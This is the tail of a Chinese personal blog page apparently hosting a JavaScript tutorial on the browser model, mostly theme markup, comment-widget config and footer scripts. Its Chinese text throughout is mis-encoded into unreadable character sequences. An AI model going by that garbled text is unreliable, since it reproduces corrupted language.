<li>self.importScripts()ï¼šåŠ è½½ JS è„šæœ¬ã€‚</li>
</ul>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">PanXiaoKang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://example.com/2021/10/17/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/">http://example.com/2021/10/17/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="http://example.com" target="_blank">å‘é˜³æ¦†æœ¨</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JavaScript/">JavaScript</a><a class="post-meta__tags" href="/tags/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86/">å‰ç«¯çŸ¥è¯†</a><a class="post-meta__tags" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/">æµè§ˆå™¨æ¨¡å‹</a></div><div class="post_share"><div class="social-share" data-image="https://mpimg.cn/view.php/58dfeb8921e8fb4a93de3dae7d99a816.jpg" data-sites="qq,wechat,facebook,twitter,weibo"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> æ‰“èµ<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="https://s1.ax1x.com/2020/06/09/t40mLD.th.png" alt="å¾®ä¿¡"/><div class="post-qr-code__desc">å¾®ä¿¡</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="https://s1.ax1x.com/2020/06/09/t4czVK.th.jpg" alt="æ”¯ä»˜å®"/><div class="post-qr-code__desc">æ”¯ä»˜å®</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2021/11/07/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/"><img class="prev_cover lazyload" data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&amp;fm=26&amp;gp=0.jpg" onerror="onerror=null;src='/img/404.png'"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info"> â‘§JavaScriptæ•™ç¨‹ä¹‹ç½‘é¡µå…ƒç´ æ¥å£</div></div></a></div><div class="next-post pull_right"><a href="/2021/10/04/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E4%BA%8B%E4%BB%B6/"><img class="next_cover lazyload" data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&amp;fm=26&amp;gp=0.jpg" onerror="onerror=null;src='/img/404.png'"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">â‘¥JavaScriptæ•™ç¨‹ä¹‹äº‹ä»¶</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> ç›¸å…³æ¨è</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2021/11/07/JavaScriptæ•™ç¨‹ä¹‹ç½‘é¡µå…ƒç´ æ¥å£/" title=" â‘§JavaScriptæ•™ç¨‹ä¹‹ç½‘é¡µå…ƒç´ æ¥å£"><img class="relatedPosts_cover lazyload"data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&fm=26&gp=0.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2021-11-07</div><div class="relatedPosts_title"> â‘§JavaScriptæ•™ç¨‹ä¹‹ç½‘é¡µå…ƒç´ æ¥å£</div></div></a></div><div class="relatedPosts_item"><a href="/2021/10/04/JavaScriptæ•™ç¨‹ä¹‹äº‹ä»¶/" title="â‘¥JavaScriptæ•™ç¨‹ä¹‹äº‹ä»¶"><img class="relatedPosts_cover lazyload"data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&fm=26&gp=0.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2021-10-04</div><div class="relatedPosts_title">â‘¥JavaScriptæ•™ç¨‹ä¹‹äº‹ä»¶</div></div></a></div><div class="relatedPosts_item"><a href="/2021/09/21/JavaScriptæ•™ç¨‹ä¹‹DOM/" title="â‘¤JavaScriptæ•™ç¨‹ä¹‹DOM"><img class="relatedPosts_cover lazyload"data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&fm=26&gp=0.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2021-09-21</div><div class="relatedPosts_title">â‘¤JavaScriptæ•™ç¨‹ä¹‹DOM</div></div></a></div><div class="relatedPosts_item"><a href="/2021/09/17/JavaScriptæ•™ç¨‹ä¹‹é¢å‘å¯¹è±¡ç¼–ç¨‹/" title="â‘£JavaScriptæ•™ç¨‹ä¹‹é¢å‘å¯¹è±¡ç¼–ç¨‹"><img class="relatedPosts_cover lazyload"data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&fm=26&gp=0.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2021-09-17</div><div class="relatedPosts_title">â‘£JavaScriptæ•™ç¨‹ä¹‹é¢å‘å¯¹è±¡ç¼–ç¨‹</div></div></a></div><div class="relatedPosts_item"><a href="/2021/08/29/JavaScriptæ•™ç¨‹ä¹‹æ ‡å‡†åº“/" title="â‘¢JavaScriptæ•™ç¨‹ä¹‹æ ‡å‡†åº“"><img class="relatedPosts_cover lazyload"data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&fm=26&gp=0.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2021-08-29</div><div class="relatedPosts_title">â‘¢JavaScriptæ•™ç¨‹ä¹‹æ ‡å‡†åº“</div></div></a></div><div class="relatedPosts_item"><a href="/2021/05/04/JavaScriptä»è¿›é˜¶åˆ°ç†Ÿæ‚‰/" title="â‘¡JavaScriptä»è¿›é˜¶åˆ°ç†Ÿæ‚‰"><img class="relatedPosts_cover lazyload"data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&fm=26&gp=0.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2021-05-04</div><div class="relatedPosts_title">â‘¡JavaScriptä»è¿›é˜¶åˆ°ç†Ÿæ‚‰</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> è¯„è®º</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;

window.valine = new Valine({
  el:'#vcomment',
  notify: true,
  verify: true,
  appId: 'z2GwNsG7RRpWpx5rt7psedl5-MdYXbMMI',
  appKey: 'gI6Yhfwz4JiUIv9546gepko8',
  placeholder: 'æ¥å§ï¼Œé€ ä½œå§ï¼Œå¿«æ´»å§ï¼Œè‚†æ— å¿Œæƒ®å§ï¼(ï½ï¿£â–½ï¿£)ï½',
  avatar: 'monsterid',
  meta: guest_info,
  pageSize: '10',
  lang: 'zh-cn',
  recordIP: false,
  serverURLs: ''
});</script></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2026 By PanXiaoKang</div><div class="framework-info"><span>é©±åŠ¨ </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div><div class="footer_custom_text">å°ä¼™ä¼´ä»¬å¥½ï¼æ¬¢è¿æ¥åˆ°<a href="https://panyongkang.github.io/" target="_blank" rel="noopener">å‘é˜³æ¦†æœ¨</a>çš„åšå®¢ï¼</div><div class="icp"><a href="http://www.beian.miit.gov.cn" target="_blank" rel="noopener"><img class="icp-icon" src="/img/icp.png"/><span>é»”ICPå¤‡54587259å·</span></a></div><div id="running-time"></div><script>setInterval(()=>{let create_time=Math.round(new Date(Date.UTC(2020,01,01,0,0,0)).getTime()/1000);let timestamp=Math.round((new Date().getTime()+8*60*60*1000)/1000);let second=timestamp-create_time;let time=new Array(0,0,0,0,0);if(second>=365*24*3600){time[0]=parseInt(second/(365*24*3600));second%=365*24*3600;}if(second>=24*3600){time[1]=parseInt(second/(24*3600));second%=24*3600;}if(second>=3600){time[2]=parseInt(second/3600);second%=3600;}if(second>=60){time[3]=parseInt(second/60);second%=60;}if(second>0){time[4]=second;}currentTimeHtml='æœ¬ç«™å·²å®‰å…¨è¿è¡Œ '+time[0]+' å¹´ '+time[1]+' å¤© '+time[2]+' æ—¶ '+time[3]+' åˆ† '+time[4]+' ç§’';document.getElementById("running-time").innerHTML=currentTimeHtml;},1000);</script></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="é˜…è¯»æ¨¡å¼"></i><i class="fa fa-plus" id="font_plus" title="æ”¾å¤§å­—ä½“"></i><i class="fa fa-minus" id="font_minus" title="ç¼©å°å­—ä½“"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="ç®€ç¹è½¬æ¢" target="_self">ç¹</a><i class="darkmode fa fa-moon-o" id="darkmode" title="å¤œé—´æ¨¡å¼"></i></div><div id="rightside-config-show"><div id="rightside_config" title="è®¾ç½®"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="ç›´è¾¾è¯„è®º"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="ç›®å½•" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="å›åˆ°é¡¶éƒ¨" aria-hidden="true"></i></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">æœ¬åœ°æœç´¢</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>ç”±</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>æä¾›æ”¯æŒ</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="canvas_nest" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="/js/third-party/canvas-nest.js"></script><script src="/js/third-party/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
document.body.addEventListener('input', POWERMODE);
</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="/js/third-party/ClickShowText.js"></script><script src="/js/search/local-search.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/platelet.model.json"},"display":{"position":"right","width":200,"height":500},"mobile":{"show":true},"log":false});</script></body></html>